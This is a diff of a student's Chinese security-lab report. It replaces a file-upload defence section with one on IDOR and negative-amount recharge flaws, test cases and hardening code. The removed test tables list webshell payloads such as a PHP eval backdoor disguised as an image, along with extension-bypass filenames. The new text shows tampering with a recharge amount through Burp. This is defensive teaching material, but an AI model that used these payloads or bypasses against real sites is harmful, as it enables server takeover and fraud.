+|------|-----------|----------|
+| TC-I05 | `50` | 充值成功 |
+| TC-I06 | `0.01` | 充值成功（下限边界） |
+| TC-I07 | `100000` | 充值成功（上限边界） |
+| TC-I08 | `-500` | 拦截：金额必须大于0 |
+| TC-I09 | `0` | 拦截：金额必须大于0 |
+| TC-I10 | `0.001` | 拦截：最低充值0.01元 |
+| TC-I11 | `100001` | 拦截：最高充值100000元 |
+| TC-I12 | `abc` | 拦截：金额格式错误 |
+| TC-I13 | `1.234` | 拦截：金额格式错误 |
+| TC-I14 | `1e5` | 拦截：金额格式错误 |
+| TC-I15 | `1\n00` | 拦截：金额格式错误 |
+| TC-I16 | `--100` | 拦截：金额格式错误 |
+| TC-I17 | `0x10` | 拦截：金额格式错误 |
 
-### 8.3 后缀白名单 + 大小写
-
-| 编号 | Payload | 预期拦截结果 |
-|------|---------|-------------|
-| TC-U08 | `test.php` | 拦截：不允许的文件类型 |
-| TC-U09 | `test.asp` | 拦截 |
-| TC-U10 | `test.pHp` | 拦截（转小写后匹配）|
-| TC-U11 | `test.pNg` | 允许（转小写后匹配白名单）|
-
-### 8.4 Windows特性绕过
-
-| 编号 | Payload | 预期拦截结果 |
-|------|---------|-------------|
-| TC-U12 | `shell.php `（尾部空格）| 拦截：非法字符 |
-| TC-U13 | `shell.php.`（尾部点号）| 拦截：非法字符 |
-| TC-U14 | `shell..png`（连续点号）| 拦截：非法字符 |
-| TC-U15 | `test.php::$DATA` | 拦截：非法字符 |
-
-### 8.5 配置文件 + 双后缀
-
-| 编号 | Payload | 预期拦截结果 |
-|------|---------|-------------|
-| TC-U16 | `.htaccess` | 拦截：非法字符 |
-| TC-U17 | `.HtAccess` | 拦截 |
-| TC-U18 | `shell.jpg.php` | 拦截：不允许的文件类型 |
-| TC-U19 | `a.png.php3` | 拦截：不允许的文件类型 |
-
-### 8.6 图片马 + WebShell
-
-| 编号 | Payload | 预期拦截结果 |
-|------|---------|-------------|
-| TC-U20 | `GIF89a<?php phpinfo();?>` 伪装 `.png` | 魔数通过 + 内容扫描拦截 |
-| TC-U21 | `<script>alert(1)</script>` 伪装 `.png` | 魔数未通过或内容扫描拦截 |
-| TC-U22 | `<?php @eval($_POST['c']);?>` 伪装 `.png` | 魔数未通过或内容扫描拦截 |
-| TC-U23 | 纯文本文件改后缀 `.png` | 魔数校验拦截 |
-
-### 8.7 配套防御
+### 8.3 限流 + 日志
 
 | 编号 | 操作 | 预期结果 |
 |------|------|----------|
-| TC-U24 | Content-Type 设 `text/html` | 拦截：非图片类型 |
-| TC-U25 | 连续6次上传（同一IP） | 第6次限流拦截 |
-| TC-U26 | 上传 >16MB 文件 | Flask返回413 |
-| TC-U27 | 访问上传文件URL | 响应含 `X-Content-Type-Options: nosniff` |
+| TC-I18 | 同一IP连续充值10次 | 前10次成功 |
+| TC-I19 | 第11次充值 | 拦截：充值过于频繁 |
+| TC-I20 | 检查 logs/balance.log | 包含时间+用户+IP+金额+余额 |
+
+### 8.4 脱敏
+
+| 编号 | 操作 | 预期结果 |
+|------|------|----------|
+| TC-I21 | admin查看个人中心 | 邮箱显 a***@example.com |
+| TC-I22 | admin查看个人中心 | 手机显 138****8000 |
+
+### 8.5 原有功能不变
+
+| 编号 | 操作 | 预期结果 |
+|------|------|----------|
+| TC-I23 | 注册新用户 | 302跳转登录页 |
+| TC-I24 | admin登录 | 欢迎回来 |
+| TC-I25 | 搜索alice | 结果表格含脱敏数据 |
+| TC-I26 | 上传真实PNG | UUID命名+预览 |
+| TC-I27 | 找回密码 | 手机验证+重置成功 |
 
 ---
 
 ## 九、实验总结与心得体会
 
-### 9.1 "文件上传比SQL注入更暴力" — 理论与实操的差距
+### 9.1 四天实训的完整脉络
 
-三天的实训（SQL注入 → WAF绕过 → 文件上传）让我最震撼的认知是：**文件上传漏洞的危害比SQL注入直接得多**。
+今天（Day4）是连续实训的最后一天，四天学到的内容恰好覆盖了Web漏洞中最主流的四类：
 
-SQL注入从发现到利用需要走完7步探测（单引号→注释→ORDER BY→UNION→AND→系统变量→元数据），期间还要面对WAF拦截、参数化查询等防御。而文件上传漏洞：
+| 天数 | 主题 | 核心攻击手法 | 核心防御原则 |
+|------|------|-------------|-------------|
+| Day1 | SQL注入 | ' UNION SELECT，7步手工注入 | 参数化查询 |
+| Day2 | WAF绕过 | 换行/注释/双层编码变形 | 纵深防御 |
+| Day3 | 文件上传 | 路径穿越/图片马/双后缀 | 白名单+魔数 |
+| Day4 | 越权+业务逻辑 | IDOR参数篡改/负数金额 | 绝不信任前端 |
 
-```
-打开Burp → 改个文件名 → 点上传 → getshell
-```
+今天的课让我感受最深的是：**前面三天的漏洞还需要一些技术水平去构造Payload，今天的越权完全是"改个数字就能搞定"**。讲师在第一场培训中演示的案例也是这样，把URL里的id从123改成124就看到了别人的订单。Burp Intruder一发出去，几千条数据几秒钟到手——没有任何技术含量，纯靠服务端"太懒"没做校验。
 
-路径就这么短。课堂演示上传WebShell到getshell全程不到30秒。亲手改包上传 `.php` 文件成功返回URL的那一刻，我才真正理解为什么老师在第一天说"文件上传是企业安全的重灾区"。
+### 9.2 "前端校验等于没做"——第二场培训的核心教训
 
-### 9.2 白名单 > 黑名单 — 被实践100%验证的原则
+第二场培训讲师的一句话我记下来了：**"前端校验的唯一作用是减少正常用户的误操作，对于攻击者来说等于没有"**。
 
-之前课堂上学"白名单优于黑名单"时觉得只是理论，但这次实训被彻底验证：
-
-**黑名单思路**（不可行）：阻止 `.php` → 攻击者用 `.pHp` `.PHP` `.PHP5` `.phtml` `.shtml` `.htaccess` ... 总有一个绕得过。黑名单需要穷举所有可能的恶意后缀，这在理论上不可能。
-
-**白名单思路**（可行）：只允许 `.jpg` `.jpeg` `.png` `.gif` → 不在列表里的全部拒绝。四个安全类型，一条判断语句，没有绕过空间。
-
-### 9.3 纵深防御不是概念，是12道防线
-
-如果只有后缀白名单：
-- 攻击者可上传 `.htaccess` 修改目录配置 → 让服务器把 `.png` 当PHP执行
-
-如果只有魔数校验：
-- 攻击者在真实图片尾部拼接WebShell代码 → 魔数通过但内容危险
-
-最终实现的12步流水线才是真正的纵深防御：
+这次实训完全验证了这一点。原始代码的充值表单在前端写了一个 `min="0"` 的HTML属性，看起来好像限制了负数。但用Burp抓包后：
 
 ```
-IP限流 → 文件名清洗 → 白名单校验 → 双后缀检测 → 魔数校验 → 
-内容扫描 → Content-Type → UUID存储 → 上传日志 → 安全响应头 → 
-异常捕获 → 文件大小限制
+原始请求：amount=50
+修改请求：amount=-50000
+点击Forward → 服务器照单全收 → 余额从99999变成49999
 ```
 
-任何单层都能被绕过，但12层全部串联后，攻击成本呈指数上升。
+整个绕过过程不到3秒。前端写的任何限制——`min`、`max`、`step`、`required`、`disabled`、`hidden`——在Burp面前都是透明的。**所有业务数值的校验必须在服务端完整做一遍**，这是今天最大的收获。
 
-### 9.4 三天实训的完整学习脉络
+### 9.3 Session vs 前端参数的信任博弈
 
-| 天数 | 主题 | 核心知识点 | 最大收获 |
-|------|------|-----------|---------|
-| Day1 | SQL手工注入 | 字符型联合查询、布尔盲注、7步探测 | 参数化查询是SQL注入的底牌 |
-| Day2 | WAF绕过防御 | 换行/注释/关键字变形绕过、双层编码 | 没有WAF是100%安全的 |
-| Day3 | 文件上传攻防 | 路径穿越、图片马、魔数校验、白名单 | 文件上传的危害比注入更直接 |
+第二场培训讲师还讲了一个关键原则：**"Session是服务端可信数据源，表单/URL参数是前端不可控数据源，两者不可混用"**。
 
-这三天的学习让我认识到：**Web安全不是学几个漏洞利用手法就够了，而是建立攻击者视角的思维模式**。每写一行代码都要想"这个参数能被怎么利用"，每个功能上线前都要过一遍常见攻击手法。
+这次项目的代码就是典型的反面教材：
+
+```
+❌ 修复前：session存了你是谁（可信），但又从URL取user_id（不可信）
+❌ 修复前：充值表单隐藏域 user_id（任何人都可以改）
+✅ 修复后：一切身份相关信息只从session读
+✅ 修复后：前端删除所有user_id的传参逻辑
+```
+
+这个设计原则不只是针对越权，SQL注入的参数化查询也是同一道理——**不要信任任何从客户端来的数据**。
+
+### 9.4 越权与文件上传的危害对比
+
+三天的文件上传防御用上了12步流水线，但越权漏洞的修复只需要核心一行代码——`cur_username = session.get("username")`。行数越少，说明这个问题越"基础"，但危害完全不比文件上传小。
+
+| 漏洞 | 利用复杂度 | 危害范围 |
+|------|-----------|----------|
+| 文件上传 | 需要构造恶意文件 | 单点getshell |
+| 水平越权 | 改一个数字 | 全部用户数据拖库 |
+| 负数金额 | Burp改一个字段 | 无限套利/盗取资金 |
+
+越权不需要发一个包就能全量拖走用户隐私数据，File upload至少还需要写个图片马。所以越权虽然"简单"，但在生产环境中的危害不容忽视。
+
+### 9.5 纵深防御在越权场景中的应用
+
+前三天学到的纵深防御思想今天同样适用。IDOR的防御不能只有一个session校验：
+
+| 层级 | 防御 | 绕过可能性 |
+|------|------|-----------|
+| ① | session身份（底层） | Session固定攻击 |
+| ② | 脱敏输出 | 脱敏后信息有限 |
+| ③ | 限流 | IP代理池绕过 |
+| ④ | IDOR探测过滤 | 变相互认绕过 |
+| ⑤ | 审计日志 | 事后溯源 |
+
+任何单层都可能被绕过，但多层叠加后攻击成本大幅增加。
 
 ---
 
 ## 十、生产环境拓展优化建议
 
-### 10.1 图片二次压缩（杜绝图片马）
+### 10.1 权限模型引入RBAC
 
 ```python
-from PIL import Image
-img = Image.open(filepath)
-img.save(filepath, "PNG")  # 重新编码，丢弃所有附加的恶意代码
+# 当前：只有一种用户类型（admin/user）
+# 生产：引入角色-权限模型
+class Permission:
+    VIEW_PROFILE = 1
+    RECHARGE = 2
+    MANAGE_USERS = 4
+
+ROLE_PERMISSIONS = {
+    "user":     Permission.VIEW_PROFILE | Permission.RECHARGE,
+    "admin":    Permission.VIEW_PROFILE | Permission.RECHARGE | Permission.MANAGE_USERS,
+    "auditor":  Permission.VIEW_PROFILE,
+}
 ```
 
-任何附加在图片尾部的代码在重编码后都会丢失。
-
-### 10.2 独立文件服务器
+### 10.2 OWASP ASVS访问控制标准
 
 ```python
-# 生产：应用服务器与静态文件服务器分离
-# 推荐阿里云OSS/AWS S3
-import boto3
-s3 = boto3.client("s3")
-s3.upload_fileobj(file, "my-bucket", f"avatars/{uuid_filename}")
+# OWASP ASVS V4 访问控制验证
+def assert_ownership(resource_owner, current_user):
+    if resource_owner != current_user:
+        log_access_violation(current_user, resource_owner)
+        raise PermissionError("无权访问该资源")
 ```
 
-即使上传了恶意文件，在独立对象存储中也无法执行。
-
-### 10.3 Redis分布式限流
+### 10.3 金额字段使用Decimal
 
 ```python
-# 当前：内存 defaultdict（进程重启后清零）
-# 生产推广：Redis计数器（持久化+分布式）
+from decimal import Decimal
+
+# 生产环境：整数分存储，避免浮点精度
+amount_cents = int(Decimal(amount_str) * 100)   # 50.00元 → 5000分
+```
+
+### 10.4 Redis分布式限流
+
+```python
 import redis
 r = redis.Redis()
-key = f"upload_rate:{request.remote_addr}"
-if r.incr(key) > 5: return "限流"
+key = f"recharge_rate:{request.remote_addr}"
+if r.incr(key) > 10:
+    return "限流"
 r.expire(key, 60)
 ```
 
-### 10.4 ClamAV病毒扫描
+### 10.5 敏感操作二次验证
 
 ```python
-import subprocess
-result = subprocess.run(["clamscan", filepath], capture_output=True)
-if b"Infected" in result.stdout:
-    os.remove(filepath)
-    return "文件包含病毒"
+# 充值/修改密码等敏感操作增加确认环节
+@app.route("/recharge_confirm", methods=["POST"])
+def recharge_confirm():
+    # 发送短信验证码或邮箱确认码
+    code = generate_code()
+    send_sms(USERS[cur_username]["phone"], f"您的充值验证码：{code}")
+    session["recharge_code"] = code
+    return render_template("recharge_confirm.html")
 ```
 
-### 10.5 Nginx安全配置
+### 10.6 安全配置汇总
 
-```nginx
-location /static/uploads/ {
-    add_header X-Content-Type-Options nosniff;
-    add_header Content-Disposition 'attachment';  # 强制下载不执行
-    valid_referers none blocked ~.example.com;
-    if ($invalid_referer) { return 403; }
-}
+```python
+app.config['SESSION_COOKIE_HTTPONLY'] = True     # 禁止JS读取session
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'    # CSRF防护
+app.config['SESSION_COOKIE_SECURE'] = True        # HTTPS Only
+app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
 ```
 
 ---
 
-## 附录：完整上传防御流水线（12步）
+## 附录：个人中心与充值接口防御流水线（8步）
 
 ```
-客户端请求上传
+用户请求 /profile 或 /recharge
   ↓
-  ① IP限流 (check_rate_limit)              ← 每分钟最多5次
+  ① Session身份检查 (cur_username = session.get)
   ↓
-  ② 文件名清洗 (sanitize_filename)          ← 过滤 ../ / \ %00 空格 . ::$DATA .htaccess
+  ② 拒绝URL/表单user_id参数（仅用session查询）
   ↓
-  ③ 清洗前后对比 → 不一致则拒绝
+  ③ SQL参数化查询（? 占位符，仅查当前用户）
   ↓
-  ④ 提取后缀 → 转小写 (ext.lower)
+  ④ amount正则校验（^\d+(\.\d{1,2})?$）
   ↓
-  ⑤ 白名单校验 (ALLOWED_EXTENSIONS)         ← 仅 jpg/jpeg/png/gif
+  ⑤ amount正负+上下限检查（>0, >=0.01, <=100000）
   ↓
-  ⑥ 双后缀检测 (split(".")检查中间段)
+  ⑥ IP限流（每分钟最多10次）
   ↓
-  ⑦ 魔数校验 (validate_magic)               ← JPEG/PNG/GIF 头部二进制签名
+  ⑦ 敏感数据脱敏输出（mask_phone/mask_email）
   ↓
-  ⑧ 恶意内容扫描 (scan_malicious_content)   ← 17种特征
-  ↓
-  ⑨ Content-Type 校验
-  ↓
-  ⑩ UUID 重命名存储
-  ↓
-  ⑪ 记录上传日志 (log_upload)
-  ↓
-  ⑫ try-except 异常捕获 → 中文提示
-  ↓
-  响应: X-Content-Type-Options: nosniff
+  ⑧ 审计日志记录（logs/balance.log）
 ```
 
 *报告人：大二网络安全实训生*
-*日期：2026年7月21日*
+*日期：2026年7月22日*
